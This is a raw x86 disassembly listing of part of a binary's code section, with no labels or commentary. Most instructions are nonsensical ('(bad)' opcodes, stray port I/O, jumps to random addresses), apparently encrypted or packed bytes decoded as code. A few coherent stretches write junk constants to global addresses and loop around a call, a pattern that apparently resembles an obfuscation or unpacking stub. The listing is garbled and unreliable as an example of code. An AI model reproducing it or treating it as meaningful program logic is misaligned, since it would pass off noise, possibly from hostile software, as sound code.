  40d5f1:	ja     0x40d5fb
  40d5f3:	mov    bh,0x4f
  40d5f5:	sti    
  40d5f6:	jmp    0x40d5f1
  40d5f8:	mov    dh,0xb6
  40d5fa:	pop    ss
  40d5fb:	jmp    0xe8114a5f
  40d600:	lock pop ss
  40d602:	cwde   
  40d603:	push   eax
  40d604:	and    bh,BYTE PTR ds:0xf6ac54a9
  40d60a:	push   es
  40d60b:	and    al,0xbc
  40d60d:	or     dh,BYTE PTR [ebp+0x11a4f664]
  40d613:	lods   al,BYTE PTR ds:[esi]
  40d614:	xchg   ebx,eax
  40d615:	or     dl,BYTE PTR [esi*4-0x3f03927d]
  40d61c:	fisub  WORD PTR ds:0x179007a9
  40d622:	sub    al,0x27
  40d624:	popf   
  40d625:	loop   0x40d64a
  40d627:	mov    edx,0xb7630bdb
  40d62c:	ins    DWORD PTR es:[edi],dx
  40d62d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d62e:	loopne 0x40d5c1
  40d630:	xchg   BYTE PTR [esi],bh
  40d632:	adc    BYTE PTR [eax],al
  40d634:	mov    WORD PTR [edi],gs
  40d636:	jmp    DWORD PTR [edx]
  40d638:	enter  0xc9a5,0xe4
  40d63c:	(bad)  
  40d63d:	rcl    DWORD PTR [esi+0x3b41d892],cl
  40d643:	xor    DWORD PTR [edx-0xa],edi
  40d646:	fsub   DWORD PTR [ecx+0x7]
  40d649:	pop    ecx
  40d64a:	stos   DWORD PTR es:[edi],eax
  40d64b:	and    eax,0xd7144dd1
  40d650:	mov    edx,0x295d50fb
  40d655:	or     esi,DWORD PTR ss:[edi+0x3d]
  40d659:	data16 sbb al,0xb3
  40d65c:	int    0xdc
  40d65e:	and    BYTE PTR [ecx],dh
  40d660:	pop    ds
  40d661:	outs   dx,BYTE PTR ds:[esi]
  40d662:	pop    eax
  40d663:	stc    
  40d664:	sqrtps xmm0,XMMWORD PTR [edi-0x2250ada]
  40d66b:	or     DWORD PTR [ecx],0xffffffea
  40d66e:	clc    
  40d66f:	mov    ebx,0x63a98a76
  40d674:	dec    esi
  40d675:	les    eax,FWORD PTR [ebp+0x66]
  40d678:	jb     0x40d6a8
  40d67a:	stos   DWORD PTR es:[edi],eax
  40d67b:	mov    dl,0xf0
  40d67d:	(bad)  
  40d67e:	cwde   
  40d67f:	jle    0x40d673
  40d681:	jg     0x40d619
  40d683:	or     BYTE PTR [edx],bh
  40d685:	and    BYTE PTR [edx-0x53db023d],bl
  40d68b:	inc    edx
  40d68c:	sub    eax,0x1a15e9d6
  40d691:	mov    bh,0x94
  40d693:	addr16 inc edx
  40d695:	jns    0x40d68b
  40d697:	loop   0x40d6ac
  40d699:	cs inc esi
  40d69b:	pop    eax
  40d69c:	cli    
  40d69d:	ret    
  40d69e:	fisttp QWORD PTR [ecx]
  40d6a0:	aam    0x3c
  40d6a2:	inc    edx
  40d6a3:	jns    0x40d687
  40d6a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6a6:	pop    ds
  40d6a7:	push   es
  40d6a8:	pop    es
  40d6a9:	stos   DWORD PTR es:[edi],eax
  40d6aa:	jg     0x40d642
  40d6ac:	sbb    edi,esi
  40d6ae:	(bad)  
  40d6af:	out    dx,al
  40d6b0:	xor    DWORD PTR [eax-0x1ec81df7],0xfffffff0
  40d6b7:	aas    
  40d6b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6b9:	mov    edx,0xd3bcc505
  40d6be:	push   es
  40d6bf:	adc    esp,ebp
  40d6c1:	cs in  al,dx
  40d6c3:	or     BYTE PTR [edi-0x92d230],dh
  40d6c9:	xor    edx,DWORD PTR [edx-0x76aae80d]
  40d6cf:	xchg   esp,eax
  40d6d0:	xor    eax,0x762b7c21
  40d6d5:	xchg   edi,eax
  40d6d6:	addr16 push ebp
  40d6d8:	add    esp,DWORD PTR [edi-0x7b72970f]
  40d6de:	out    0x3f,al
  40d6e0:	xchg   esp,eax
  40d6e1:	pop    ebx
  40d6e2:	adc    eax,DWORD PTR [ecx+ebx*2-0x6a]
  40d6e6:	pop    ebp
  40d6e7:	inc    eax
  40d6e8:	sbb    ah,BYTE PTR [esi+0x44]
  40d6eb:	test   ebp,esp
  40d6ed:	std    
  40d6ee:	jne    0x40d716
  40d6f0:	mov    al,0xf1
  40d6f2:	mov    bh,0x81
  40d6f4:	movntps XMMWORD PTR [ecx+0x3a78b2e4],xmm5
  40d6fb:	mov    ebp,0xd9be0ba
  40d700:	(bad)  
  40d701:	mov    ds:0x1c1e785f,al
  40d706:	pop    esp
  40d707:	inc    ecx
  40d708:	jmp    0x40d755
  40d70a:	js     0x2dce78c9
  40d710:	stos   BYTE PTR es:[edi],al
  40d711:	scas   al,BYTE PTR es:[edi]
  40d712:	movups XMMWORD PTR [edx],xmm5
  40d715:	push   esi
  40d716:	xchg   DWORD PTR [eax+0x71],ebx
  40d719:	cmp    al,0xa7
  40d71b:	lods   al,BYTE PTR ds:[esi]
  40d71c:	outs   dx,BYTE PTR ds:[esi]
  40d71d:	jmp    0x40d75d
  40d71f:	aaa    
  40d720:	ins    DWORD PTR es:[edi],dx
  40d721:	nop
  40d722:	xchg   ebx,eax
  40d723:	add    DWORD PTR [eax+eax*8+0x10],esp
  40d727:	or     esi,DWORD PTR [ebp-0x5b]
  40d72a:	lock fwait
  40d72c:	scas   al,BYTE PTR es:[edi]
  40d72d:	add    eax,0xfb3ba726
  40d732:	pushf  
  40d733:	mov    ch,0x31
  40d735:	test   eax,0xee629a82
  40d73a:	popf   
  40d73b:	add    DWORD PTR [edi-0x77e5fec8],0x76
  40d742:	xchg   esi,eax
  40d743:	addr16 fwait
  40d745:	(bad)  
  40d746:	test   al,0x60
  40d748:	adc    DWORD PTR [edx-0x1d9ab647],ebp
  40d74e:	in     al,dx
  40d74f:	out    dx,al
  40d750:	push   ecx
  40d751:	loop   0x40d6e3
  40d753:	pop    eax
  40d754:	retf   
  40d755:	lock ja 0x40d7a0
  40d758:	or     dh,BYTE PTR [ebx+esi*2]
  40d75b:	push   eax
  40d75c:	and    eax,0x8ca9dea5
  40d761:	xor    DWORD PTR [esi],eax
  40d763:	aaa    
  40d764:	xchg   ebp,eax
  40d765:	repnz add esp,esi
  40d768:	mov    ch,BYTE PTR [eax-0x7b041fef]
  40d76e:	mov    al,ds:0xf4a453e8
  40d773:	sbb    BYTE PTR [edx-0x727392a6],bl
  40d779:	mov    edx,0x1da73511
  40d77e:	pop    edx
  40d77f:	neg    cl
  40d781:	fs out 0xc7,eax
  40d784:	in     al,0x10
  40d786:	cmp    bh,BYTE PTR [edi-0x66801e9d]
  40d78c:	jge    0x40d7d3
  40d78e:	and    BYTE PTR [edi+0x31d16fc4],ah
  40d794:	or     BYTE PTR [eax-0x68],cl
  40d797:	push   ebp
  40d798:	rcr    BYTE PTR [ecx-0xa],1
  40d79b:	xor    al,0x50
  40d79d:	shr    DWORD PTR [ebp+ecx*1-0x3fd6889c],1
  40d7a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7a5:	bound  esp,QWORD PTR [esi-0x79]
  40d7a8:	xchg   ecx,eax
  40d7a9:	and    BYTE PTR [ebp-0x2767133f],0x7a
  40d7b0:	(bad)  
  40d7b1:	or     al,0xfc
  40d7b3:	cmp    al,0x99
  40d7b5:	cmp    ch,ch
  40d7b7:	cmp    eax,0x99ae71a4
  40d7bc:	cmp    edi,0x33c
  40d7c2:	mov    DWORD PTR ds:0x42a7bd,0x14bd
  40d7cc:	jne    0x40dd11
  40d7d2:	and    eax,DWORD PTR ds:0x42a7c5
  40d7d8:	jmp    0x40da30
  40d7dd:	int    0xca
  40d7df:	(bad)  
  40d7e0:	into   
  40d7e1:	(bad)  
  40d7e3:	aad    0xc9
  40d7e5:	lea    edi,[esi-0xbba1ba3]
  40d7eb:	jne    0x40d7d5
  40d7ed:	pop    ecx
  40d7ee:	test   eax,0x7e357878
  40d7f3:	js     0x40d86d
  40d7f5:	pop    edx
  40d7f6:	fistp  WORD PTR [esi]
  40d7f8:	xor    BYTE PTR [ebp+0x62],dl
  40d7fb:	mov    cl,al
  40d7fd:	or     DWORD PTR [edi],0xa28238dc
  40d803:	mov    cl,0xa2
  40d805:	fld    DWORD PTR [eax]
  40d807:	mov    edx,0x4f696553
  40d80c:	push   ds
  40d80d:	dec    ebx
  40d80e:	adc    dh,ch
  40d810:	stos   BYTE PTR es:[edi],al
  40d811:	mov    bl,0x77
  40d813:	cmc    
  40d814:	aaa    
  40d815:	and    BYTE PTR [ebp+esi*2-0x781d1b90],bl
  40d81c:	inc    eax
  40d81d:	inc    edx
  40d81e:	push   esi
  40d81f:	and    edi,edx
  40d821:	mov    ds:0xfc03d487,eax
  40d826:	shl    esi,0xc1
  40d829:	push   ebx
  40d82a:	rcr    DWORD PTR [edi+0x50e9b39a],cl
  40d830:	or     BYTE PTR [edx+0x1271b1dd],ch
  40d836:	xchg   DWORD PTR [edi-0x36add979],ebp
  40d83c:	inc    esp
  40d83d:	sub    DWORD PTR [esi+eax*8],eax
  40d840:	xchg   esi,eax
  40d841:	mov    eax,DWORD PTR [eax]
  40d843:	ja     0x40d7d3
  40d845:	jmp    0x40d8af
  40d847:	mov    ds:0x9ed63fb1,al
  40d84c:	cmp    esp,DWORD PTR [edi+edi*4]
  40d84f:	sub    edx,ecx
  40d851:	gs mov ch,0x19
  40d854:	add    eax,0x9a90c64d
  40d859:	out    dx,al
  40d85a:	aaa    
  40d85b:	jno    0x40d809
  40d85d:	cdq    
  40d85e:	mov    ebp,0xa673d519
  40d863:	iret   
  40d864:	push   0x75ed1720
  40d869:	jp     0x40d83a
  40d86b:	popf   
  40d86c:	mov    ch,0xa4
  40d86e:	dec    esp
  40d86f:	jnp    0x40d843
  40d871:	push   ds
  40d872:	xor    DWORD PTR gs:[ebx-0x360f6d3f],esi
  40d879:	mov    edx,0xcb7420e1
  40d87e:	in     eax,dx
  40d87f:	in     eax,0x74
  40d881:	inc    edi
  40d882:	mov    dh,0x95
  40d884:	dec    ebp
  40d885:	out    0xa8,al
  40d887:	mov    cl,0x2a
  40d889:	(bad)  
  40d88a:	pusha  
  40d88b:	adc    BYTE PTR [ebp+0x69],dh
  40d88e:	pushf  
  40d88f:	pop    edx
  40d890:	lods   al,BYTE PTR ds:[esi]
  40d891:	(bad)  
  40d893:	shl    BYTE PTR ds:0x90c45d81,1
  40d899:	test   al,0xe3
  40d89b:	out    0x3f,al
  40d89d:	fcom   DWORD PTR [esi]
  40d89f:	outs   dx,DWORD PTR ds:[esi]
  40d8a0:	cmp    al,0xfc
  40d8a2:	es push ebp
  40d8a4:	iret   
  40d8a5:	mov    al,ds:0x8adbe0f2
  40d8aa:	pop    ds
  40d8ab:	inc    ebx
  40d8ac:	in     eax,dx
  40d8ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8ae:	in     al,0xd6
  40d8b0:	add    al,0x0
  40d8b2:	sahf   
  40d8b3:	mov    BYTE PTR [eax-0x7b],bl
  40d8b6:	ffreep st(3)
  40d8b8:	and    esi,esp
  40d8ba:	arpl   WORD PTR [edx-0x1c935004],di
  40d8c0:	iret   
  40d8c1:	mov    ds:0x27e9470e,al
  40d8c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8c8:	xor    ch,BYTE PTR [ecx-0x1039a693]
  40d8ce:	xchg   esp,eax
  40d8cf:	push   ebp
  40d8d0:	add    ah,BYTE PTR [ebx-0x7ff2d6ca]
  40d8d6:	mov    ds:0xc47a3ee3,eax
  40d8db:	arpl   WORD PTR [edx+0x32],cx
  40d8de:	stos   BYTE PTR es:[edi],al
  40d8df:	fmul   st,st(6)
  40d8e1:	mov    al,ds:0x507d6e40
  40d8e6:	jbe    0x40d939
  40d8e8:	movaps xmm6,XMMWORD PTR [ebx+0x1b]
  40d8ec:	push   cs
  40d8ed:	les    eax,FWORD PTR [ebx+ebp*8+0x1cc98063]
  40d8f4:	xchg   edi,eax
  40d8f5:	xor    dh,BYTE PTR [edi]
  40d8f7:	daa    
  40d8f8:	rdpmc  
  40d8fa:	jle    0x40d8d2
  40d8fc:	inc    esp
  40d8fd:	ins    BYTE PTR es:[edi],dx
  40d8fe:	lds    edx,FWORD PTR [esp+ebx*2+0x7711370c]
  40d905:	sub    DWORD PTR [esi],ecx
  40d907:	and    dl,dh
  40d909:	div    BYTE PTR [esi-0x2d9920d5]
  40d90f:	ret    
  40d910:	sbb    edx,DWORD PTR [esi+0x7b]
  40d913:	mov    WORD PTR [eax],?
  40d915:	(bad)  [edi]
  40d917:	xchg   edi,eax
  40d918:	fcmovnb st,st(6)
  40d91a:	sub    dh,BYTE PTR [esi]
  40d91c:	sbb    bh,bh
  40d91e:	pop    ss
  40d91f:	inc    esi
  40d920:	push   edx
  40d921:	and    al,0x93
  40d923:	pop    ebx
  40d924:	(bad)  
  40d926:	lock sbb DWORD PTR [edi],esi
  40d929:	(bad)  
  40d92a:	loop   0x40d993
  40d92c:	scas   al,BYTE PTR es:[edi]
  40d92d:	xchg   esp,eax
  40d92e:	lods   al,BYTE PTR ds:[esi]
  40d92f:	aam    0x3b
  40d931:	jbe    0x40d94f
  40d933:	sbb    ebx,edx
  40d935:	xor    al,0xac
  40d937:	mov    cl,0x9e
  40d939:	stc    
  40d93a:	add    al,0x91
  40d93c:	ficom  WORD PTR [ecx]
  40d93e:	loopne 0x40d908
  40d940:	hlt    
  40d941:	repz popf 
  40d943:	mov    ds:0x70ee5420,eax
  40d948:	fst    QWORD PTR [ebp-0xd]
  40d94b:	or     al,0xc6
  40d94d:	fxch   st(4)
  40d94f:	xchg   edx,eax
  40d950:	xchg   esp,eax
  40d951:	stos   BYTE PTR es:[edi],al
  40d952:	sbb    eax,0x8879dc08
  40d957:	sti    
  40d958:	push   0x49
  40d95a:	inc    ebp
  40d95b:	xchg   DWORD PTR [ebx-0x6f6a988f],eax
  40d961:	sti    
  40d962:	sahf   
  40d963:	(bad)  
  40d964:	ins    DWORD PTR es:[edi],dx
  40d965:	fmulp  st(5),st
  40d967:	cmp    bh,BYTE PTR [ecx+0x1679d73f]
  40d96d:	scas   al,BYTE PTR es:[edi]
  40d96e:	jmp    0x5866e2f5
  40d973:	loope  0x40d9e4
  40d975:	es cmp eax,0x1382589
  40d97b:	fild   QWORD PTR [edi]
  40d97d:	cmp    DWORD PTR [edx-0x4f53e632],edx
  40d983:	das    
  40d984:	scas   eax,DWORD PTR es:[edi]
  40d985:	mov    ah,0x38
  40d987:	ins    BYTE PTR es:[edi],dx
  40d988:	cld    
  40d989:	pop    ecx
  40d98a:	mov    bl,0x35
  40d98c:	ins    DWORD PTR es:[edi],dx
  40d98d:	pop    ebx
  40d98e:	and    ebp,DWORD PTR [esp+edx*4-0x2]
  40d992:	push   edi
  40d993:	inc    esi
  40d994:	sub    dl,dh
  40d996:	ins    BYTE PTR es:[edi],dx
  40d997:	adc    al,0x56
  40d999:	or     eax,0xe91e72cc
  40d99e:	or     BYTE PTR [ecx],ah
  40d9a0:	iret   
  40d9a1:	xor    al,0xa3
  40d9a3:	gs cs sahf 
  40d9a6:	pushf  
  40d9a7:	and    BYTE PTR [ecx],al
  40d9a9:	jecxz  0x40d97e
  40d9ab:	into   
  40d9ac:	mov    ecx,0x10bf2ddc
  40d9b1:	mov    ds:0xb768128b,eax
  40d9b6:	mov    eax,ds:0xe1ae965f
  40d9bb:	cmc    
  40d9bc:	bound  edi,QWORD PTR [eax-0x2]
  40d9bf:	push   ss
  40d9c0:	test   BYTE PTR [edi-0x1c],ah
  40d9c3:	push   0x31d471e
  40d9c8:	aaa    
  40d9c9:	mov    ecx,DWORD PTR [edi-0x35]
  40d9cc:	adc    BYTE PTR [edi],cl
  40d9ce:	retf   
  40d9cf:	pop    ebp
  40d9d0:	jecxz  0x40da0d
  40d9d2:	ret    
  40d9d3:	retf   0x77c7
  40d9d6:	cmp    BYTE PTR [edx-0x7db50889],bh
  40d9dc:	lock rcr cl,1
  40d9df:	mov    edi,0x4cd97025
  40d9e4:	mov    ebx,edx
  40d9e6:	add    bl,BYTE PTR ds:0x12ed3157
  40d9ec:	rcl    BYTE PTR [edi+0x75],cl
  40d9ef:	or     BYTE PTR [esi+ebp*1],bl
  40d9f2:	or     esi,0x58
  40d9f5:	aam    0x3d
  40d9f7:	sub    eax,0xf9164bf
  40d9fc:	lods   al,BYTE PTR ds:[esi]
  40d9fd:	es (bad) 
  40d9ff:	jmp    0x40d9bf
  40da01:	jae    0x40d99c
  40da03:	imul   ecx,DWORD PTR [edx-0x66762321],0xffffffdd
  40da0a:	in     al,0x86
  40da0c:	xchg   ebx,eax
  40da0d:	ins    BYTE PTR es:[edi],dx
  40da0e:	mov    bl,0x9a
  40da10:	inc    ebp
  40da11:	sar    BYTE PTR [ebp+edi*2+0x64],cl
  40da15:	test   al,0xfc
  40da17:	in     eax,0x99
  40da19:	mov    ebp,0xe2911245
  40da1e:	dec    edi
  40da20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da21:	lods   al,BYTE PTR ds:[esi]
  40da22:	mov    ebx,0x67a8dc60
  40da27:	ret    
  40da28:	bound  eax,QWORD PTR [esi-0x3f]
  40da2b:	jb     0x40d9e2
  40da2d:	fdiv   QWORD PTR [eax+0x8658302]
  40da33:	add    BYTE PTR [ecx+0x42a831],ah
  40da39:	sbb    eax,DWORD PTR ds:0x42a809
  40da3f:	mov    ds:0x42a831,eax
  40da44:	mov    eax,DWORD PTR [ebp-0x8]
  40da47:	xor    DWORD PTR ds:0x42a7f1,0x42a7bd
  40da51:	sub    eax,DWORD PTR [ebp+0x8]
  40da54:	or     DWORD PTR ds:0x42a801,0xc38
  40da5e:	push   eax
  40da5f:	adc    DWORD PTR ds:0x42a771,0x6147
  40da69:	mov    eax,DWORD PTR [ebp-0x4]
  40da6c:	jmp    0x40dcc4
  40da71:	enter  0xc6c0,0x3c
  40da75:	(bad)  
  40da76:	ret    0xd4da
  40da79:	push   cs
  40da7a:	in     al,dx
  40da7b:	pop    edi
  40da7c:	dec    esi
  40da7d:	pop    ecx
  40da7e:	in     al,0xf9
  40da80:	pop    ss
  40da81:	push   ss
  40da82:	scas   al,BYTE PTR es:[edi]
  40da83:	js     0x40dafd
  40da85:	xor    eax,0x5a78787e
  40da8a:	(bad)  
  40da8b:	push   ebx
  40da8c:	inc    ebx
  40da8d:	cld    
  40da8e:	and    dl,BYTE PTR [ebx]
  40da90:	mov    al,BYTE PTR [ebp+0x1c6d4929]
  40da96:	mov    WORD PTR [ebx],fs
  40da98:	stc    
  40da99:	lods   al,BYTE PTR ds:[esi]
  40da9a:	nop
  40da9b:	rcl    cl,0x59
  40da9e:	fimul  WORD PTR [esi+0x35aff498]
  40daa4:	and    ah,BYTE PTR [edx]
  40daa6:	pop    es
  40daa7:	les    esi,FWORD PTR [ecx+0x51d4ddc5]
  40daad:	fadd   DWORD PTR [edx-0x52afc6d5]
  40dab3:	mov    ds:0x7eb61d31,al
  40dab8:	mov    eax,ds:0x5f7404d1
  40dabd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dabe:	sar    BYTE PTR [ecx+0x23468b56],0x55
  40dac5:	pop    ebx
  40dac6:	ret    
  40dac7:	or     eax,0xdf75728f
  40dacc:	mov    fs,WORD PTR [esp+ecx*8]
  40dacf:	pop    edi
  40dad0:	into   
  40dad1:	pop    edx
  40dad2:	jp     0x40daf7
  40dad4:	jns    0x40dafc
  40dad6:	sbb    BYTE PTR [ebp-0x10],0x4a
  40dada:	mov    al,0xee
  40dadc:	sub    esi,DWORD PTR [ecx-0x7c]
  40dadf:	outs   dx,DWORD PTR ds:[esi]
  40dae0:	cmp    al,0x6d
  40dae2:	sub    DWORD PTR [eax+0x0],ebp
  40dae5:	mov    ecx,0x5931c4b
  40daea:	sbb    ax,0xec0
  40daee:	mov    ebp,0x1d74da34
  40daf3:	dec    ebp
  40daf4:	cli    
  40daf5:	scas   eax,DWORD PTR es:[edi]
  40daf6:	push   ecx
  40daf7:	push   ecx
  40daf8:	repz in al,0x7f
  40dafb:	fcom   DWORD PTR [ebx]
  40dafd:	pop    eax
  40dafe:	push   edi
  40daff:	dec    edx
  40db00:	mov    ebx,0x5759c08
  40db05:	jp     0x40dabb
  40db07:	mov    bh,0x4f
  40db09:	add    BYTE PTR [edx+0x3246f441],0x77
  40db10:	cs inc ebp
  40db12:	fstp   TBYTE PTR [ebp+0x5e]
  40db15:	les    edi,FWORD PTR [ebx]
  40db17:	ret    
  40db18:	jecxz  0x40db8d
  40db1a:	pop    ebx
  40db1b:	sbb    bh,BYTE PTR [ebp-0x4b]
  40db1e:	mov    esi,0x9567b4fd
  40db23:	gs mov ch,0xa3
  40db26:	repz or BYTE PTR [esi-0x5a],ah
  40db2a:	outs   dx,BYTE PTR ds:[esi]
  40db2b:	(bad)  
  40db2c:	dec    esi
  40db2d:	bound  edi,QWORD PTR [edi+ebx*4-0x196cbddb]
  40db34:	push   edx
  40db35:	or     BYTE PTR [eax],ah
  40db37:	xor    al,0x57
  40db39:	xchg   DWORD PTR [ecx-0x43],edi
  40db3c:	sbb    BYTE PTR [ebx-0x4c],al
  40db3f:	call   FWORD PTR [edi-0x6b16d91d]
  40db45:	(bad)  [edx]
  40db47:	ins    BYTE PTR es:[edi],dx
  40db48:	dec    ebx
  40db49:	clc    
  40db4a:	cmp    dl,al
  40db4c:	test   BYTE PTR [ebx-0x35],dl
  40db4f:	cmp    ebx,eax
  40db51:	pop    es
  40db52:	pop    eax
  40db53:	out    dx,eax
  40db54:	mov    cs,WORD PTR [eax+edx*8+0x5f99ac9e]
  40db5b:	adc    al,0xf6
  40db5d:	stos   DWORD PTR es:[edi],eax
  40db5e:	jl     0x40dbdd
  40db60:	shr    BYTE PTR [ecx+eax*4+0x18],1
  40db64:	ins    DWORD PTR es:[edi],dx
  40db65:	ret    
  40db66:	push   cs
  40db67:	mov    ds:0x532177ca,eax
  40db6c:	cwde   
  40db6d:	push   ss
  40db6e:	jbe    0x40db81
  40db70:	cli    
  40db71:	mov    edi,0x493b4b29
  40db76:	pop    edi
  40db77:	xchg   esi,eax
  40db78:	(bad)  
  40db79:	pop    ss
  40db7a:	cmp    DWORD PTR ss:[edx],ecx
  40db7d:	neg    BYTE PTR [eax]
  40db7f:	rcr    DWORD PTR [ebx-0x2a4ac5dc],cl
  40db85:	jns    0x40dbdd
  40db87:	dec    edi
  40db88:	stc    
  40db89:	scas   eax,DWORD PTR es:[edi]
  40db8a:	jg     0x40db26
  40db8c:	sub    BYTE PTR [ebx+0x4f],dl
  40db8f:	cli    
  40db90:	(bad)  
  40db91:	cli    
  40db92:	ins    BYTE PTR es:[edi],dx
  40db93:	test   DWORD PTR ds:0x81086db2,esp
  40db99:	inc    esi
  40db9a:	in     al,dx
  40db9b:	push   cs
  40db9c:	js     0x40dbc9
  40db9e:	loope  0x40dbe5
  40dba0:	dec    esp
  40dba1:	out    dx,eax
  40dba2:	mov    ah,0x86
  40dba4:	mov    BYTE PTR [eax+0x69],ah
  40dba7:	xor    DWORD PTR [esi+0x345cc8d0],ebx
  40dbad:	pop    eax
  40dbae:	xchg   ebx,eax
  40dbaf:	xchg   ecx,eax
  40dbb0:	lods   al,BYTE PTR ds:[esi]
  40dbb1:	imul   eax
  40dbb3:	into   
  40dbb4:	sub    BYTE PTR [eax-0x1ef9cb04],ah
  40dbba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbbb:	popa   
  40dbbc:	test   ah,0xc4
  40dbbf:	dec    eax
  40dbc0:	dec    esi
  40dbc1:	call   0xbb732840
  40dbc6:	out    dx,al
  40dbc7:	mov    eax,ds:0x34831394
  40dbcc:	jno    0xcd013343
  40dbd2:	and    ah,BYTE PTR [edx+0x51]
  40dbd5:	push   ecx
  40dbd6:	sar    bl,cl
  40dbd8:	dec    esp
  40dbd9:	mov    esi,0x2b6652dc
  40dbde:	ret    
  40dbdf:	mov    bl,bl
  40dbe1:	sbb    eax,0xff4768d9
  40dbe6:	xchg   ecx,eax
  40dbe7:	xchg   esi,eax
  40dbe8:	cmp    edi,esp
  40dbea:	and    eax,0xdd23f776
  40dbef:	pop    es
  40dbf0:	loope  0x40dc0d
  40dbf2:	pop    eax
  40dbf3:	xor    dl,cl
  40dbf5:	mov    al,0xde
  40dbf7:	sbb    BYTE PTR [ebx],cl
  40dbf9:	adc    eax,eax
  40dbfb:	test   al,0xca
  40dbfd:	daa    
  40dbfe:	cmp    ecx,eax
  40dc00:	pop    ss
  40dc01:	jmp    0x1668f3d0
  40dc06:	dec    edx
  40dc07:	add    ebx,DWORD PTR [edx-0x596d085a]
  40dc0d:	gs hlt 
  40dc0f:	(bad)  
  40dc10:	adc    eax,0x9bc2bc65
  40dc15:	out    dx,eax
  40dc16:	cld    
  40dc17:	nop
  40dc18:	pop    edi
  40dc19:	xchg   ebx,eax
  40dc1a:	(bad)  
  40dc1b:	mov    ebp,0x813f6e67
  40dc20:	pop    ebx
  40dc21:	(bad)  
  40dc22:	xchg   esi,eax
  40dc23:	jecxz  0x40dbc7
  40dc25:	ret    0x405a
  40dc28:	mov    edi,DWORD PTR [esi-0x7b]
  40dc2b:	fwait
  40dc2c:	or     eax,0x6f8c6cb9
  40dc31:	dec    edx
  40dc32:	jbe    0x40dbc7
  40dc34:	neg    BYTE PTR [ecx-0xd]
  40dc37:	xchg   edi,eax
  40dc38:	cmp    BYTE PTR [eax+edi*4-0x3a],al
  40dc3c:	jge    0x40dc56
  40dc3e:	mov    cl,0xc8
  40dc40:	mov    edx,0x64f19b7d
  40dc45:	cmp    BYTE PTR [ecx],0x5e
  40dc48:	das    
  40dc49:	(bad)  
  40dc4a:	jmp    0xc295476
  40dc4f:	popa   
  40dc50:	mul    ch
  40dc52:	stos   DWORD PTR es:[edi],eax
  40dc53:	pushf  
  40dc54:	mov    eax,ds:0xfe2aae93
  40dc59:	call   0x9c16b5f6
  40dc5e:	test   dl,0x12
  40dc61:	loopne 0x40dc13
  40dc63:	arpl   WORD PTR [esi],dx
  40dc65:	pop    ebx
  40dc66:	jecxz  0x40dc4b
  40dc68:	aas    
  40dc69:	jmp    0x4486:0xc4d7186a
  40dc70:	dec    edx
  40dc71:	iret   
  40dc72:	hlt    
  40dc73:	or     esp,DWORD PTR [ebp+0x1e]
  40dc76:	imul   ebp,DWORD PTR [eax+0xc758492],0x60
  40dc7d:	mov    esi,0x3b00ac0c
  40dc82:	inc    ebp
  40dc83:	fcom   DWORD PTR [edi+0x22]
  40dc86:	xor    al,0xca
  40dc88:	imul   ebx,DWORD PTR [ecx-0x3fa13f91],0x32
  40dc8f:	int3   
  40dc90:	cmp    DWORD PTR ds:0xccf6828,ecx
  40dc96:	loop   0x40dcd5
  40dc98:	pusha  
  40dc99:	ror    bh,cl
  40dc9b:	(bad)  
  40dc9c:	jg     0x40dc6f
  40dc9e:	idiv   DWORD PTR [esi]
  40dca0:	dec    eax
  40dca2:	(bad)  
  40dca3:	fst    DWORD PTR [eax+0x30517b7d]
  40dca9:	mov    bl,BYTE PTR [ecx-0x3b440a74]
  40dcaf:	or     esi,DWORD PTR [ecx+0x7c388470]
  40dcb5:	lods   eax,DWORD PTR ds:[esi]
  40dcb6:	neg    BYTE PTR [ebp+0x64]
  40dcb9:	jno    0x40dcd0
  40dcbb:	sbb    DWORD PTR [edi+0x19],edi
  40dcbe:	pop    edi
  40dcbf:	mov    esp,0xe1f45d5f
  40dcc4:	add    eax,DWORD PTR [ebp+0x8]
  40dcc7:	add    DWORD PTR ds:0x42a881,0x296a
  40dcd1:	push   eax
  40dcd2:	adc    DWORD PTR ds:0x42a75d,0x7658
  40dcdc:	call   0x40e99f
  40dce1:	mov    DWORD PTR ds:0x42a7b5,0x7bae
  40dceb:	inc    DWORD PTR [ebp+0x8]
  40dcee:	cmp    DWORD PTR [ebp+0x8],0x52
  40dcf2:	mov    DWORD PTR ds:0x42a831,0x71fa
  40dcfc:	jb     0x40da34
  40dd02:	mov    DWORD PTR ds:0x42a83d,0x568b
  40dd0c:	jmp    0x40e979
  40dd11:	cmp    edi,0x1a2
  40dd17:	jne    0x40e497
  40dd1d:	sbb    DWORD PTR ds:0x42a7b9,edx
  40dd23:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  40dd2a:	mov    eax,DWORD PTR [ebp-0x4]
  40dd2d:	mov    DWORD PTR [ebp-0x5c],eax
  40dd30:	mov    eax,DWORD PTR [ebp-0x8]
  40dd33:	mov    DWORD PTR [ebp-0x58],eax
  40dd36:	movzx  eax,WORD PTR ds:0x42a7b1
  40dd3d:	and    DWORD PTR ds:0x42a781,eax
  40dd43:	mov    eax,DWORD PTR [ebp-0xc]
  40dd46:	adc    DWORD PTR ds:0x42a871,0x42a87d
  40dd50:	xor    eax,esi
  40dd52:	jmp    0x40dfaa
  40dd57:	rol    eax,0x3e
  40dd5a:	leave  
  40dd5b:	leave  
  40dd5c:	leave  
  40dd5d:	leave  
  40dd5e:	rcr    BYTE PTR [ebx+0x66],0x3b
  40dd62:	inc    esi
  40dd63:	or     ch,dh
  40dd65:	(bad)  
  40dd66:	cmp    al,0xd3
  40dd68:	lods   al,BYTE PTR ds:[esi]
  40dd69:	js     0x40dde3
  40dd6b:	xor    eax,0x9678787e
  40dd70:	sub    ecx,esi
  40dd72:	(bad)  
  40dd73:	sbb    ebx,eax
  40dd75:	mov    esi,0xeee867f4
  40dd7a:	sub    dh,BYTE PTR [eax+0x3f]
  40dd7d:	or     edi,DWORD PTR [edi+0x3f98126e]
  40dd83:	add    DWORD PTR [edx-0x136fc053],eax
  40dd89:	pop    esi
